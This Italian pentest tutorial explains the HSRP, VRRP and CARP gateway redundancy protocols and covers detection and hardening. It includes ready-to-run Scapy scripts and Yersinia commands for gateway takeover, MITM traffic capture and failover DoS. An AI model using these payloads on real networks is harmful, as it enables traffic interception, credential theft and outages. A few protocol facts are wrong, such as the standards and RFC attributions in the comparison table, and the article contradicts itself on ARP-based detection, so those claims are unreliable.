---
title: 'VRRP, HSRP e CARP: gateway takeover, failover e attacchi MITM'
slug: vrrp-hsrp-carp
description: 'Scopri come funzionano VRRP, HSRP e CARP, come avviene il failover del gateway e perché takeover, priority abuse e MITM sono rischi reali nei pentest di rete.'
image: /vrrp-hsrp-carp.webp
draft: true
date: 2026-03-26T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - hsrp-coup
  - gateway-takeover
---

VRRP, HSRP e CARP sono i protocolli di ridondanza del gateway. Capire cos'è VRRP e come funziona HSRP è fondamentale per chi fa pentesting su reti enterprise: questi protocolli trasmettono annunci in chiaro su multicast, senza autenticazione di default, e chiunque nel segmento può diventare il gateway attivo della rete. Un attacco HSRP o VRRP ben eseguito posiziona l'attaccante come default gateway di tutti gli host del segmento in pochi secondi.

***

## Cos'è la ridondanza del gateway: VRRP/HSRP/CARP

In una rete enterprise, il default gateway è il punto di uscita di tutti gli host verso le reti esterne. Se il gateway va down, tutti gli host del segmento perdono connettività. Per evitare questo single point of failure, si usano protocolli di ridondanza che mantengono un **Virtual IP (VIP)** condiviso tra due o più router fisici: se il router attivo cade, uno standby prende il controllo del VIP in modo trasparente.

I tre protocolli principali:

| Protocollo                                | Standard                    | Vendor                 | Porta/Proto                                           |
| ----------------------------------------- | --------------------------- | ---------------------- | ----------------------------------------------------- |
| HSRP (Hot Standby Router Protocol)        | Proprietario Cisco          | Cisco                  | UDP 1985, multicast 224.0.0.2 (v1) / 224.0.0.102 (v2) |
| VRRP (Virtual Router Redundancy Protocol) | Standard IEEE — RFC 5798    | Tutti                  | IP proto 112, multicast 224.0.0.18                    |
| CARP (Common Address Redundancy Protocol) | Standard OpenBSD — RFC 5798 | BSD, pfSense, OPNsense | IP proto 112, multicast 224.0.0.18                    |

Tutti e tre operano al **livello 3 del modello OSI**, ma interagiscono con il livello 2 tramite indirizzi MAC virtuali.

***

## Come funziona HSRP

### HSRP: Hot Standby Router Protocol

HSRP è il protocollo di ridondanza proprietario Cisco, definito nell'**RFC 2281**. Crea un **gruppo HSRP** con:

* Un **Virtual IP (VIP):** l'indirizzo IP usato dagli host come default gateway
* Un **Virtual MAC:** `00:00:0C:07:AC:XX` dove XX è il numero del gruppo (hex)
* Un router **Active:** gestisce il VIP e risponde al traffico
* Un router **Standby:** pronto a diventare Active se quello primario cade

### Il processo di elezione HSRP

I router del gruppo HSRP si scambiano messaggi **Hello** ogni 3 secondi via multicast. Vince l'elezione il router con la **Priority** più alta (default: 100). In caso di parità, vince l'IP più alto.

Stati HSRP:

| Stato   | Descrizione                             |
| ------- | --------------------------------------- |
| Initial | Avvio                                   |
| Listen  | Riceve Hello ma non è Active né Standby |
| Speak   | Candidato, invia Hello                  |
| Standby | Backup pronto al failover               |
| Active  | Gestisce il VIP                         |

### Versioni HSRP

**HSRPv1:** UDP porta 1985, multicast 224.0.0.2, autenticazione in chiaro opzionale.

**HSRPv2:** UDP porta 1985, multicast 224.0.0.102, supporto IPv6, autenticazione MD5 opzionale. Virtual MAC: `00:00:0C:9F:FX:XX`.

***

## Come funziona VRRP

### VRRP: Virtual Router Redundancy Protocol

VRRP è lo standard aperto equivalente a HSRP, definito nell'**RFC 5798** (VRRPv3 per IPv4 e IPv6). Usa **IP protocol number 112** e multicast **224.0.0.18**.

Differenze principali rispetto a HSRP:

* Il router con Priority più alta diventa **Master** (non "Active")
* Priority 255 è riservata al proprietario del VIP (il router il cui IP fisico corrisponde al VIP)
* Il Virtual MAC è `00:00:5E:00:01:XX` dove XX è il VRID (Virtual Router ID)
* Hello ogni 1 secondo di default (più rapido di HSRP)
* Autenticazione deprecata in VRRPv3 (era presente in VRRPv2 ma considerata insicura)

***

## Come funziona CARP

### CARP: Common Address Redundancy Protocol

CARP nasce in OpenBSD come alternativa open-source a VRRP (che aveva problemi di brevetti). Usa la stessa porta IP 112 e multicast 224.0.0.18, ma ha meccanismi crittografici più robusti:

* Usa **HMAC-SHA1** con una password condivisa per autenticare i messaggi
* Il master viene eletto in base alla priority e all'advertising interval
* Supportato su OpenBSD, FreeBSD, NetBSD, pfSense, OPNsense

CARP è l'unico dei tre con autenticazione crittografica integrata per default.

***

## Dove vengono usati VRRP, HSRP e CARP nelle reti

* **LAN enterprise:** coppia di router o firewall in HA (High Availability) con HSRP o VRRP come gateway predefinito
* **Datacenter:** gateway di default per i server, spesso con più gruppi HSRP/VRRP per VLAN diverse
* **Firewall cluster:** Cisco ASA, Fortinet, Palo Alto usano HSRP o VRRP per HA attivo-standby o attivo-attivo
* **Reti ISP:** gateway di accesso per i clienti in configurazione ridondante
* **Ambienti BSD/pfSense:** CARP per HA su firewall open-source

In qualsiasi rete enterprise con ridondanza del gateway, uno di questi tre protocolli è quasi certamente attivo. E quasi sempre senza autenticazione, o con autenticazione MD5 in chiaro (facilmente cracckabile).

***

## Perché VRRP e HSRP sono importanti in cybersecurity

HSRP e VRRP sono progettati per essere veloci e semplici: inviano messaggi in chiaro (o con autenticazione opzionale spesso non configurata) e sono completamente fiduciosi verso chiunque nel segmento invii messaggi validi.

Un attaccante che invia un messaggio HSRP con Priority 255 diventa immediatamente il router Active del gruppo. Tutti gli host del segmento iniziano a inviare il loro traffico verso il MAC dell'attaccante. È un attacco man-in-the-middle a livello di rete, senza bisogno di ARP spoofing — e spesso completamente non rilevato dai sistemi di detection tradizionali.

Per il livello su cui operano questi protocolli, vedi [IP Internet Protocol](https://hackita.it/articoli/ip-internet-protocol). Per le implicazioni sulle VLAN, vedi [VLAN e 802.1Q](https://hackita.it/articoli/vlan). Per tecniche MITM complementari, vedi [ARP](https://hackita.it/articoli/arp) e [Man in the Middle](https://hackita.it/articoli/man-in-the-middle).

***

## VRRP, HSRP e CARP in un engagement di pentesting

### Reconnaissance: identificare il protocollo attivo

Il traffico HSRP e VRRP è visibile su qualsiasi interfaccia nel segmento. Ascoltare il multicast rivela immediatamente il protocollo in uso, il VIP, le priority, e i router coinvolti:

```bash
# Catturare tutto il traffico di ridondanza gateway
tcpdump -i eth0 -nn '(udp port 1985) or (proto 112)'
```

In Wireshark:

```
hsrp || vrrp || carp
```

In pochi secondi si vedono:

* Il VIP del gruppo (= il default gateway degli host)
* Il router Active/Master corrente e la sua Priority
* Il router Standby e la sua Priority
* Il Virtual MAC address
* Se è configurata autenticazione (e di che tipo)

### Enumeration con Nmap e script

```bash
# VRRP discovery
nmap --script broadcast-listener -e eth0

# Identificare router HSRP con priority e VIP
tshark -i eth0 -Y "hsrp" -T fields -e ip.src -e hsrp.prio -e hsrp.virtip
```

### Attack surface: HSRP Coup (gateway takeover)

L'attacco principale: diventare il router Active inviando un Hello HSRP con Priority superiore a quella del router attuale. Se l'autenticazione non è configurata (o si conosce la password), l'attacco richiede un singolo pacchetto.

Con **Yersinia**:

```bash
yersinia hsrp -attack 1 -interface eth0
# Attack 1: becoming active router
```

Con Scapy (HSRP):

```python
from scapy.all import *

hsrp_coup = (
    Ether(dst="01:00:5e:00:00:02") /
    IP(src="192.168.1.100", dst="224.0.0.2", ttl=1) /
    UDP(sport=1985, dport=1985) /
    HSRP(state=16,          # Active state
         priority=255,       # Massima priority
         group=1,
         virtualIP="192.168.1.1")
)
sendp(hsrp_coup, iface="eth0", loop=1, inter=3)
```

Una volta diventato Active, tutto il traffico del segmento verso l'esterno passa per l'attaccante. Con IP forwarding abilitato, la connettività rimane intatta e l'attacco è completamente trasparente agli utenti:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Attacco VRRP analogo

```python
from scapy.all import *

vrrp_advert = (
    Ether(dst="01:00:5e:00:00:12") /
    IP(src="192.168.1.100", dst="224.0.0.18", ttl=255, proto=112) /
    VRRP(vrid=1,
         priority=255,
         addrlist=["192.168.1.1"])
)
sendp(vrrp_advert, iface="eth0", loop=1, inter=1)
```

### Intercettazione del traffico post-takeover

Dopo il takeover del gateway, tutto il traffico uscente dal segmento passa per l'attaccante. Con [sniffing](https://hackita.it/articoli/sniffing) passivo:

```bash
tcpdump -i eth0 -w traffic_capture.pcap
```

Si cattura: credenziali su protocolli non cifrati, traffico DNS, sessioni HTTP, dati applicativi, traffico verso altri segmenti interni.

Combinato con SSL stripping (se gli host non usano HSTS), si ottiene visibilità anche su parte del traffico HTTPS.

### HSRP DoS: bloccare il failover

Inviare messaggi HSRP Resign dal router Active spoof a forza il failover verso lo Standby. Ripetuto continuamente, causa oscillazioni continue tra Active e Standby:

```bash
yersinia hsrp -attack 2 -interface eth0
# Attack 2: sending coup
```

### Pivot attraverso il VIP

Dopo essere diventato il router Active, l'attaccante gestisce il VIP e può redirigere il traffico verso qualsiasi destinazione: reti interne normalmente non raggiungibili, server di esfiltrazione, o endpoint di C2.

***

## Attacchi e abusi possibili con VRRP/HSRP/CARP

### HSRP/VRRP Coup (Active/Master Takeover)

Come descritto: inviare Hello con Priority 255 per diventare il router Active/Master. Effetto immediato: tutto il traffico del segmento transita per l'attaccante.

### HSRP/VRRP DoS

Inviare continuamente messaggi con Priority alternanti per causare oscillazioni del router Active, interrompendo la connettività del segmento.

### Credential Sniffing da autenticazione debole

Se HSRP è configurato con autenticazione in chiaro (la password è visibile nel payload del pacchetto UDP):

```
tshark -i eth0 -Y "hsrp" -T fields -e hsrp.auth
```

Se usa MD5, la password può essere attaccata offline con hashcat.

### Persistent Gateway Takeover

Dopo aver preso il controllo come Active, mantenere il ruolo ritrasmettendo continuamente Hello con Priority 255. Il router legittimo non può riottenere il ruolo finché l'attaccante è attivo.

***

## Esempi pratici con VRRP/HSRP/CARP in laboratorio

### Analisi completa HSRP con tshark

```bash
tshark -i eth0 -Y "hsrp" -T fields \
  -e ip.src \
  -e hsrp.state \
  -e hsrp.prio \
  -e hsrp.virtip \
  -e hsrp.auth \
  -e hsrp.group
```

### Visualizzare lo stato HSRP su un router Cisco (post-compromise)

```
show standby brief
show standby
```

Output completo: gruppo, stato, VIP, priority, Active/Standby corrente, timer.

### Analisi VRRP con Wireshark

```
vrrp.prio == 255     # Advertisement con priority massima (possibile attacco)
vrrp.type == 1       # Advertisement packet
```

### Yersinia per attacchi HSRP e VRRP

```bash
# Interfaccia grafica
yersinia -G

# HSRP takeover da CLI
yersinia hsrp -attack 1 -interface eth0

# VRRP takeover
yersinia vrrp -attack 1 -interface eth0
```

***

## Detection e difesa VRRP/HSRP/CARP

Un difensore che monitora HSRP e VRRP può rilevare:

* **Cambio improvviso del router Active/Master:** variazione del MAC associato al VIP è il segnale più evidente — rilevabile con gli stessi meccanismi usati per l'ARP spoofing
* **Hello con Priority 255 da IP non autorizzati:** nessun router legittimo dovrebbe inviare Priority 255 se non è il proprietario del VIP
* **Oscillazioni rapide del gateway attivo:** cambi di stato ripetuti in breve tempo indicano un attacco DoS o coup
* **Hello HSRP senza autenticazione o con password non riconosciuta:** configurazione anomala o attacco
* **Traffico HSRP/VRRP da host non router:** le workstation non dovrebbero mai inviare questi pacchetti

Tool: syslog dai router con logging HSRP/VRRP abilitato, **arpwatch** per rilevare variazioni del MAC del gateway, **Zeek** con script di analisi HSRP/VRRP.

***

## Hardening e mitigazioni VRRP/HSRP/CARP

### Autenticazione HSRP con MD5 (minimo)

```
standby 1 authentication md5 key-string <password_lunga>
```

Meglio: usare key chain con rotazione periodica:

```
key chain HSRP-KEYS
 key 1
  key-string <password>
  accept-lifetime 00:00:00 Jan 1 2024 infinite
  send-lifetime 00:00:00 Jan 1 2024 infinite

interface GigabitEthernet0/0
 standby 1 authentication md5 key-chain HSRP-KEYS
```

### Autenticazione VRRP con IPSec (VRRPv3)

VRRPv3 ha deprecato l'autenticazione nativa. La soluzione raccomandata è usare **IPSec AH** per proteggere il traffico VRRP:

```
! IPSec policy per proteggere 224.0.0.18 proto 112
crypto map VRRP-PROTECTION 10 ipsec-isakmp
```

### Filtrare il traffico HSRP/VRRP sulle porte di accesso

Nessun host utente dovrebbe poter inviare traffico HSRP o VRRP. Configura ACL sulle porte di accesso degli switch per bloccare UDP 1985 e IP protocol 112 da host non router:

```
ip access-list extended BLOCK-GATEWAY-REDUNDANCY
 deny udp any any eq 1985       ! HSRP
 deny 112 any any               ! VRRP/CARP
 permit ip any any
```

### Priority configurata esplicitamente

Non lasciare la priority di default (100 su tutti i router). Configura Priority 110 sul router primario e 90 sul secondario. Questo non impedisce l'attacco, ma permette di rilevare facilmente qualsiasi router con Priority superiore a 110 come non autorizzato.

### Preempt controllato

Abilita `preempt` solo sul router primario, con un delay per evitare flapping:

```
standby 1 preempt delay minimum 30
```

Questo non è una difesa contro gli attacchi, ma riduce l'impatto delle oscillazioni legittime.

### Monitorare il MAC del gateway

Configurare alerting (con arpwatch, Zeek, o SIEM) per notificare immediatamente qualsiasi variazione del MAC associato al VIP. Una variazione del MAC del gateway è il segnale più affidabile di un takeover in corso.

***

## Errori comuni su VRRP e HSRP

**"L'autenticazione MD5 HSRP è sicura"**
MD5 è debole per standard moderni. La password può essere catturata dai pacchetti HSRP (è nel campo auth in hex) e attaccata offline. È molto meglio di nessuna autenticazione, ma non è una soluzione definitiva.

**"VRRP è più sicuro di HSRP perché è uno standard"**
VRRPv3 ha rimosso l'autenticazione nativa, delegandola a IPSec. Senza IPSec, VRRP è completamente privo di autenticazione — più vulnerabile di HSRP con MD5.

**"Solo i router possono partecipare al gruppo HSRP/VRRP"**
Falso. Qualsiasi host Linux con Scapy o Yersinia può inviare messaggi HSRP/VRRP validi. Non c'è nessun meccanismo che impedisca a un PC di diventare il router Active.

**"Il takeover HSRP richiede tempo"**
No. Con Priority 255 e un singolo pacchetto, il takeover avviene nel tempo di un Hello interval (3 secondi per HSRP). Praticamente immediato dal punto di vista umano.

***

## FAQ su VRRP/HSRP/CARP

**Cos'è HSRP e a cosa serve?**
HSRP (Hot Standby Router Protocol) è un protocollo Cisco per la ridondanza del gateway. Permette a due o più router di condividere un Virtual IP usato dagli host come default gateway. Se il router attivo cade, quello standby assume automaticamente il controllo del VIP.

**Qual è la differenza tra HSRP e VRRP?**
HSRP è proprietario Cisco e usa UDP 1985. VRRP è lo standard aperto (RFC 5798) che usa IP protocol 112. Funzionalmente sono equivalenti. HSRP ha autenticazione MD5 opzionale; VRRPv3 delega la sicurezza a IPSec.

**Come si esegue un attacco HSRP?**
Inviando un messaggio Hello HSRP con Priority 255 nel segmento. Se l'autenticazione non è configurata, il router che invia questo Hello diventa immediatamente il router Active. Tool come Yersinia automatizzano completamente l'attacco.

**Come si rileva un attacco HSRP in corso?**
Il segnale più affidabile è la variazione del MAC associato al VIP. arpwatch rileva questo cambio e può inviare alerting. Monitorare anche il traffico HSRP per Hello con Priority 255 da IP non autorizzati.

**CARP è sicuro?**
CARP include autenticazione HMAC-SHA1 obbligatoria con password condivisa. È il più sicuro dei tre per design, ma dipende dalla robustezza della password condivisa. Usato principalmente in ambienti BSD/pfSense.

***

## Conclusione su VRRP/HSRP/CARP

VRRP, HSRP e CARP sono protocolli che quasi nessuno include nel proprio threat model. Eppure sono attivi su qualsiasi rete enterprise con ridondanza del gateway, inviano annunci in chiaro ogni pochi secondi, e nella maggior parte degli ambienti non hanno autenticazione configurata.

Un attacco HSRP richiede un singolo pacchetto. In 3 secondi l'attaccante è il default gateway di tutti gli host del segmento. Il traffico transita in chiaro senza che nessun utente se ne accorga. Nessun sistema di detection basato su ARP lo rileva.

È uno degli attacchi MITM più semplici ed efficaci disponibili in un engagement di internal network pentesting.

Approfondisci i protocolli correlati:

* [IP Internet Protocol: il livello di rete](https://hackita.it/articoli/ip-internet-protocol)
* [ARP: l'alternativa al gateway spoofing](https://hackita.it/articoli/arp)
* [OSPF, EIGRP, BGP, RIP: protocolli di routing e sicurezza](https://hackita.it/articoli/ospf-eigrp-bgp-rip)
* [VLAN e 802.1Q: segmentazione e implicazioni](https://hackita.it/articoli/vlan)
* [Man in the Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle)
* [Sniffing e analisi del traffico post-takeover](https://hackita.it/articoli/sniffing)
* [IPSec: protezione per VRRP](https://hackita.it/articoli/ipsec)

Riferimento ufficiale: [RFC 5798 — Virtual Router Redundancy Protocol (VRRP) Version 3](https://datatracker.ietf.org/doc/html/rfc5798)

***

HSRP e VRRP senza autenticazione sono una finding critica che compare in quasi ogni pentest su reti enterprise. Se vuoi sapere se la tua infrastruttura è esposta:
[hackita.it/servizi](https://hackita.it/servizi)

Tutto il contenuto di HackITA è scritto e pubblicato gratuitamente. Puoi supportare il progetto qui:
[hackita.it/supporto](https://hackita.it/supporto)
